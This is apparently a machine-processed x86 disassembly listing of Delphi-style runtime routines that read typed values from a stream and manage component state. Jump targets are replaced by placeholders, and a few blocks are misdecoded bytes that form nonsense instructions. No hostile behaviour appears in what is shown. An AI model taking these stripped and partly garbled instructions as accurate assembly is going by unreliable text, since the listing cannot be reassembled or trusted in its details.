mov eax ebx
call sub_41dc40
mov eax ebx
call sub_41cc3c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41de5c
mov eax ebx
call sub_41dcf8
sub_41d280
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40676c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_419740
inc esi
dec ebx
jne r-xdata
sub_41d2bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_420604
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40676c
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
mov edx ebx
mov eax edi
call sub_4205d8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40676c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_4205d8
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41d334
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40676c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
movzx eax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
movzx eax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41d39c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41d3bc
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_402f84
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41d39c
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41eec8
call sub_402f84
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_404650
sub_41d41c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41d502
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41f068
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x72 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x74 ]
call [ esi + 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41d4d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41d507
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41d3bc
pop ecx
test al al
jne r-xdata
call sub_404f40
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_404eec
sub_41d52c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41d5a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_40484c
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_4193e4
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41d5a9
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41d3bc
pop ecx
test al al
jne r-xdata
call sub_404f40
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_404eec
sub_41d5cc
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41d647
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41f068
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_40484c
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d64c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41d3bc
pop ecx
test al al
jne r-xdata
call sub_404f40
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_404eec
sub_41d670
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41d894
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41e9e4
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41e9e4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41d864
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41d822
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41d2bc
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
movzx eax [ r-xdata ]
call sub_41d334
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41d41c
pop ecx
push ebp
call sub_41d5cc
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41d52c
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_404f70
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
movzx eax [ r-xdata ]
call sub_41d334
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
movzx eax [ r-xdata ]
call sub_41d334
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d89b
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406934
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_40484c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4198f4
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41d280
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_419740
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41d280
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_419740
sub_41d827
push ebp
call sub_41d39c
pop ecx
test al al
je r-xdata
call sub_404eec
call sub_404f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_404650
sub_41d8b0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d920
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41d90b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d920
mov eax [ ebp - 0x4 ]
call sub_41cde0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cf48
retn
sub_41d920
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc3c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41de5c
mov eax [ ebp - 0x4 ]
call sub_41dcf8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_40484c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41d9e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_40484c
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc3c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d670
mov eax [ ebp - 0x4 ]
call sub_41dcf8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d9e9
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41d9f0
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41ebc0
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41da28
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41d058
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41da28
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41ebc0
cmp al 0x15
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41dcac
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41d058
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41da6c
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41ebc0
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41dcac
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41d058
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41dab0
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41ebc0
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41dcac
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41d058
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41db00
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41ebc0
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41dcac
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41d058
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41db44
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41ebc0
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41ca68
movzx eax [ eax + lookup_table_41db6c ]
jmp [ eax * 4 + jump_table_41db7a ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41d058
movzx ecx [ esp ]
mov eax esi
xor edx edx
call sub_405620
mov eax esi
call j_sub_4059f0
mov edx eax
movzx ecx [ esp ]
mov eax ebx
call sub_41d058
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_405584
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_405584
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_405584
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_405584
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41dc40
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41ebc0
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41d058
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41d058
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41d058
jmp r-xdata
jmp r-xdata
call sub_41ca68
sub_41dcac
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41d034
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41dc40
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41ebc0
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41d058
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41dd00
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx eax [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41d034
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41ebc0
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41dc40
mov [ edi ] eax
sub_41dd3d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41de31
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405530
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4055c8
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de38
lea eax [ ebp - 0x4 ]
call sub_405530
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_404530
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_405794
sub_41de5c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e0a4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_404c5c#4
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41e9e4
xor edx edx
push ebp
push j_sub_404c5c#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x1
sub eax 0x4
mov eax [ eax ]
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x80
push eax
mov ecx ebx
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_405a44
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_404890
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x80 ]
call sub_4165a4
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_404890
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x80 ]
call sub_4165a4
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41e258
jmp r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
add eax 0x80
mov edx [ ebp - 0x8 ]
call sub_405584
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0xc ]
call sub_41d044
mov eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_416614
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0xc ]
call sub_41d044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41de40
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e0ab
lea eax [ ebp - 0x8 ]
call sub_405530
retn
mov [ ebp - 0x10 ] ebx
jmp r-xdata
sub_41e05b
add [ eax ] eax
add [ eax ] al
dec eax
mov eax [ eax ]
loopne r-xdata
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x88 ] 0x0
je r-xdata
call sub_404eec
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_404f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e0ab
lea eax [ ebp - 0x8 ]
call sub_405530
retn
sub_41e0b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_41928c
mov ebx eax
test ebx ebx
je r-xdata
call sub_41ca68
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_416688
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e0fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c4d4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_419740
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41e13c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41e18b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f2ec
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_416bcc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e192
lea eax [ ebp - 0x10 ]
call sub_411650
retn
sub_41e198
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41e24a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d034
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41db44
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c4d4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_419740
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ebc0
lea eax [ ebp - 0x4 ]
call sub_40700c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_416c80
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e251
lea eax [ ebp - 0x8 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
sub_41e258
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
